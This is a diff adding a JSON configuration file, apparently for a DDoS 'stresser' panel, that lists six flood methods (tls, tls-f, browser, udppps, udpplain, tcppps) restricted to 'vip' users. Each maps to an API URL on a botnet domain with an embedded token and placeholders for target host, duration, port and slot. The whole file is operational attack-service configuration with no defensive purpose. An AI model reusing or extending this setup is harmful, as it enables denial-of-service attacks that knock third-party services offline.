@@ -1,0 +1,38 @@
+[
+  {
+    "name": "tls",
+    "desripsi": "Layer 7",
+    "permission": ["vip"],
+    "api": "https://botnet.atlastresser.site/attack?token=asulama&target=<<$host>>&time=<<$time>>&method=tls"
+  },
+  {
+    "name": "tls-f",
+    "desripsi": "Layer 7",
+    "permission": ["vip"],
+    "api": "https://botnet.atlastresser.site/attack?token=asulama&target=<<$host>>&time=<<$time>>&method=tls-f"
+  },
+  {
+    "name": "browser",
+    "desripsi": "Layer 7",
+    "permission": ["vip"],
+    "api": "https://botnet.atlastresser.site/attack?token=asulama&target=<<$host>>&time=<<$time>>&method=browser"
+  },
+  {
+    "name": "udppps",
+    "desripsi": "Layer 4",
+    "permission": ["vip"],
+    "api": "https://botnet.atlastresser.site/attack?token=asulama&target=<<$host>>&time=<<$time>>&method=udppps&port=<<$port>>&slot=<<$slot>>"
+  },
+  {
+    "name": "udpplain",
+    "desripsi": "Layer 4",
+    "permission": ["vip"],
+    "api": "https://botnet.atlastresser.site/attack?token=asulama&target=<<$host>>&time=<<$time>>&method=udpplain&port=<<$port>>&slot=<<$slot>>"
+  },
+  {
+    "name": "tcppps",
+    "desripsi": "Layer 4",
+    "permission": ["vip"],
+    "api": "https://botnet.atlastresser.site/attack?token=asulama&target=<<$host>>&time=<<$time>>&method=tcppps&port=<<$port>>&slot=<<$slot>>"
+  }
+]
